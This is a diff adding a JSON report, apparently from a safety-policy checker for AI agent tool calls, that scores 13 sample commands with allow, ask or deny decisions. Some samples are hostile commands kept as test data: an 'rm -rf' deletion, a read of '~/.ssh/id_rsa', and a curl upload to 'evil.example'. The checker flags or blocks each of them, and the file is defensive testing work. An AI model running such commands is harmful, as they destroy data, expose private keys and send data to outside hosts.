@@ -1,0 +1,391 @@
+{
+  "generated_at": "2026-07-22T00:00:00Z",
+  "policy": "tool_safety_policy.json",
+  "samples": 13,
+  "matched_expected": 13,
+  "results": [
+    {
+      "tool_name": "workspace_exec",
+      "command": "go test ./...",
+      "backend": "workspaceexec",
+      "decision": "allow",
+      "risk_level": "low",
+      "rule_id": "ALLOW_POLICY",
+      "evidence": "command satisfies configured policy",
+      "recommendation": "execute only in the configured sandbox",
+      "blocked": false,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": null,
+      "span_attributes": {
+        "tool.safety.backend": "workspaceexec",
+        "tool.safety.decision": "allow",
+        "tool.safety.risk_level": "low",
+        "tool.safety.rule_id": "ALLOW_POLICY"
+      }
+    },
+    {
+      "tool_name": "host_exec",
+      "command": "rm -rf /tmp/project",
+      "backend": "hostexec",
+      "decision": "deny",
+      "risk_level": "critical",
+      "rule_id": "DENIED_COMMAND",
+      "evidence": "rm",
+      "recommendation": "remove the denied command",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "deny",
+          "risk_level": "critical",
+          "rule_id": "DENIED_COMMAND",
+          "evidence": "rm",
+          "recommendation": "remove the denied command"
+        },
+        {
+          "decision": "deny",
+          "risk_level": "critical",
+          "rule_id": "DESTRUCTIVE_COMMAND",
+          "evidence": "rm -rf /tmp/project",
+          "recommendation": "do not run destructive filesystem commands"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "hostexec",
+        "tool.safety.decision": "deny",
+        "tool.safety.risk_level": "critical",
+        "tool.safety.rule_id": "DENIED_COMMAND"
+      }
+    },
+    {
+      "tool_name": "workspace_exec",
+      "command": "cat ~/.ssh/id_rsa",
+      "backend": "workspaceexec",
+      "decision": "deny",
+      "risk_level": "critical",
+      "rule_id": "FORBIDDEN_PATH",
+      "evidence": "/.ssh",
+      "recommendation": "remove access to the protected path",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "deny",
+          "risk_level": "critical",
+          "rule_id": "FORBIDDEN_PATH",
+          "evidence": "/.ssh",
+          "recommendation": "remove access to the protected path"
+        },
+        {
+          "decision": "deny",
+          "risk_level": "critical",
+          "rule_id": "FORBIDDEN_PATH",
+          "evidence": "~/.ssh",
+          "recommendation": "remove access to the protected path"
+        },
+        {
+          "decision": "deny",
+          "risk_level": "critical",
+          "rule_id": "SECRET_READ",
+          "evidence": "cat ~/.ssh/id_rsa",
+          "recommendation": "use a secret provider instead of reading credential files"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "workspaceexec",
+        "tool.safety.decision": "deny",
+        "tool.safety.risk_level": "critical",
+        "tool.safety.rule_id": "FORBIDDEN_PATH"
+      }
+    },
+    {
+      "tool_name": "workspace_exec",
+      "command": "curl https://evil.example/upload",
+      "backend": "workspaceexec",
+      "decision": "deny",
+      "risk_level": "critical",
+      "rule_id": "NETWORK_NOT_ALLOWLISTED",
+      "evidence": "evil.example",
+      "recommendation": "add a reviewed domain to allowed_domains or remove the request",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "deny",
+          "risk_level": "critical",
+          "rule_id": "NETWORK_NOT_ALLOWLISTED",
+          "evidence": "evil.example",
+          "recommendation": "add a reviewed domain to allowed_domains or remove the request"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "workspaceexec",
+        "tool.safety.decision": "deny",
+        "tool.safety.risk_level": "critical",
+        "tool.safety.rule_id": "NETWORK_NOT_ALLOWLISTED"
+      }
+    },
+    {
+      "tool_name": "workspace_exec",
+      "command": "curl https://api.github.com/repos/openai/openai",
+      "backend": "workspaceexec",
+      "decision": "allow",
+      "risk_level": "low",
+      "rule_id": "ALLOW_POLICY",
+      "evidence": "command satisfies configured policy",
+      "recommendation": "execute only in the configured sandbox",
+      "blocked": false,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": null,
+      "span_attributes": {
+        "tool.safety.backend": "workspaceexec",
+        "tool.safety.decision": "allow",
+        "tool.safety.risk_level": "low",
+        "tool.safety.rule_id": "ALLOW_POLICY"
+      }
+    },
+    {
+      "tool_name": "host_exec",
+      "command": "bash -c echo-safe",
+      "backend": "hostexec",
+      "decision": "ask",
+      "risk_level": "high",
+      "rule_id": "SHELL_WRAPPER",
+      "evidence": "bash -c echo-safe",
+      "recommendation": "expand and review the wrapped command before execution",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "ask",
+          "risk_level": "high",
+          "rule_id": "SHELL_WRAPPER",
+          "evidence": "bash -c echo-safe",
+          "recommendation": "expand and review the wrapped command before execution"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "hostexec",
+        "tool.safety.decision": "ask",
+        "tool.safety.risk_level": "high",
+        "tool.safety.rule_id": "SHELL_WRAPPER"
+      }
+    },
+    {
+      "tool_name": "workspace_exec",
+      "command": "git status | head",
+      "backend": "workspaceexec",
+      "decision": "ask",
+      "risk_level": "high",
+      "rule_id": "SHELL_METACHAR",
+      "evidence": "git status | head",
+      "recommendation": "use argv execution without shell metacharacters",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "ask",
+          "risk_level": "high",
+          "rule_id": "SHELL_METACHAR",
+          "evidence": "git status | head",
+          "recommendation": "use argv execution without shell metacharacters"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "workspaceexec",
+        "tool.safety.decision": "ask",
+        "tool.safety.risk_level": "high",
+        "tool.safety.rule_id": "SHELL_METACHAR"
+      }
+    },
+    {
+      "tool_name": "code_exec",
+      "command": "go install example.com/untrusted@latest",
+      "backend": "codeexec",
+      "decision": "ask",
+      "risk_level": "high",
+      "rule_id": "NETWORK_UNPARSED",
+      "evidence": "go install example.com/untrusted@latest",
+      "recommendation": "provide a literal allowlisted HTTPS URL",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "ask",
+          "risk_level": "high",
+          "rule_id": "NETWORK_UNPARSED",
+          "evidence": "go install example.com/untrusted@latest",
+          "recommendation": "provide a literal allowlisted HTTPS URL"
+        },
+        {
+          "decision": "ask",
+          "risk_level": "high",
+          "rule_id": "DEPENDENCY_CHANGE",
+          "evidence": "go install example.com/untrusted@latest",
+          "recommendation": "pin and review dependencies in an isolated build environment"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "codeexec",
+        "tool.safety.decision": "ask",
+        "tool.safety.risk_level": "high",
+        "tool.safety.rule_id": "NETWORK_UNPARSED"
+      }
+    },
+    {
+      "tool_name": "workspace_exec",
+      "command": "sleep 120",
+      "backend": "workspaceexec",
+      "decision": "ask",
+      "risk_level": "medium",
+      "rule_id": "LONG_RUNNING",
+      "evidence": "sleep 120",
+      "recommendation": "reduce duration below the configured timeout",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "ask",
+          "risk_level": "medium",
+          "rule_id": "LONG_RUNNING",
+          "evidence": "sleep 120",
+          "recommendation": "reduce duration below the configured timeout"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "workspaceexec",
+        "tool.safety.decision": "ask",
+        "tool.safety.risk_level": "medium",
+        "tool.safety.rule_id": "LONG_RUNNING"
+      }
+    },
+    {
+      "tool_name": "code_exec",
+      "command": "echo data",
+      "backend": "codeexec",
+      "decision": "deny",
+      "risk_level": "high",
+      "rule_id": "OUTPUT_LIMIT",
+      "evidence": "9999999",
+      "recommendation": "lower the maximum output size",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "deny",
+          "risk_level": "high",
+          "rule_id": "OUTPUT_LIMIT",
+          "evidence": "9999999",
+          "recommendation": "lower the maximum output size"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "codeexec",
+        "tool.safety.decision": "deny",
+        "tool.safety.risk_level": "high",
+        "tool.safety.rule_id": "OUTPUT_LIMIT"
+      }
+    },
+    {
+      "tool_name": "host_exec",
+      "command": "go test ./...",
+      "backend": "hostexec",
+      "decision": "ask",
+      "risk_level": "high",
+      "rule_id": "HOST_SESSION",
+      "evidence": "go test ./...",
+      "recommendation": "prefer workspaceexec; require approval and process-tree cleanup",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "ask",
+          "risk_level": "high",
+          "rule_id": "HOST_SESSION",
+          "evidence": "go test ./...",
+          "recommendation": "prefer workspaceexec; require approval and process-tree cleanup"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "hostexec",
+        "tool.safety.decision": "ask",
+        "tool.safety.risk_level": "high",
+        "tool.safety.rule_id": "HOST_SESSION"
+      }
+    },
+    {
+      "tool_name": "workspace_exec",
+      "command": "custom-linter ./...",
+      "backend": "workspaceexec",
+      "decision": "ask",
+      "risk_level": "medium",
+      "rule_id": "ENV_NOT_ALLOWLISTED",
+      "evidence": "UNREVIEWED_SETTING",
+      "recommendation": "remove the environment variable or add it after review",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "ask",
+          "risk_level": "medium",
+          "rule_id": "ENV_NOT_ALLOWLISTED",
+          "evidence": "UNREVIEWED_SETTING",
+          "recommendation": "remove the environment variable or add it after review"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "workspaceexec",
+        "tool.safety.decision": "ask",
+        "tool.safety.risk_level": "medium",
+        "tool.safety.rule_id": "ENV_NOT_ALLOWLISTED"
+      }
+    },
+    {
+      "tool_name": "workspace_exec",
+      "command": "go test ./...",
+      "backend": "workspaceexec",
+      "decision": "deny",
+      "risk_level": "critical",
+      "rule_id": "FORBIDDEN_WORKING_DIR",
+      "evidence": "~/.ssh",
+      "recommendation": "choose a working directory outside protected paths",
+      "blocked": true,
+      "redacted": false,
+      "duration_micros": 0,
+      "findings": [
+        {
+          "decision": "deny",
+          "risk_level": "critical",
+          "rule_id": "FORBIDDEN_WORKING_DIR",
+          "evidence": "~/.ssh",
+          "recommendation": "choose a working directory outside protected paths"
+        },
+        {
+          "decision": "deny",
+          "risk_level": "critical",
+          "rule_id": "FORBIDDEN_WORKING_DIR",
+          "evidence": "~/.ssh",
+          "recommendation": "choose a working directory outside protected paths"
+        }
+      ],
+      "span_attributes": {
+        "tool.safety.backend": "workspaceexec",
+        "tool.safety.decision": "deny",
+        "tool.safety.risk_level": "critical",
+        "tool.safety.rule_id": "FORBIDDEN_WORKING_DIR"
+      }
+    }
+  ]
+}
